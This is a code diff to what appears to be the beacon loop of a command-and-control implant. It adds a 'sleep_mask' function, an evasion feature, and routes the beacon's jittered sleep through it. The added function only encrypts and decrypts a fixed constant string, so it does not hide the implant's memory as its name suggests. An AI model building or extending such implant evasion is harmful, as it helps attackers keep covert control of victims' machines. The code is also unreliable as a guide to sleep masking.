@@ -33,6 +33,23 @@ def simple_encrypt(data: str) -> str:
 def simple_decrypt(data: str) -> str:
     return wire_decrypt(data)
 
+def sleep_mask(seconds):
+    import os
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    src = b'sockpuppets-sleep-mask'
+    try:
+        key = os.urandom(32)
+        nonce = os.urandom(12)
+        ct = AESGCM(key).encrypt(nonce, src, b'sockpuppets-sleep-mask-v1')
+    except Exception:
+        time.sleep(seconds)
+        return
+    time.sleep(seconds)
+    try:
+        AESGCM(key).decrypt(nonce, ct, b'sockpuppets-sleep-mask-v1')
+    except Exception:
+        pass
+
 
 def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
     if jitter_percent <= 0 or jitter_percent > 100:
@@ -190,7 +207,7 @@ def connect_to_server():
                             })
 
             sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
-            time.sleep(sleep_time)
+            sleep_mask(sleep_time)
 
         except Exception:
             time.sleep(5)
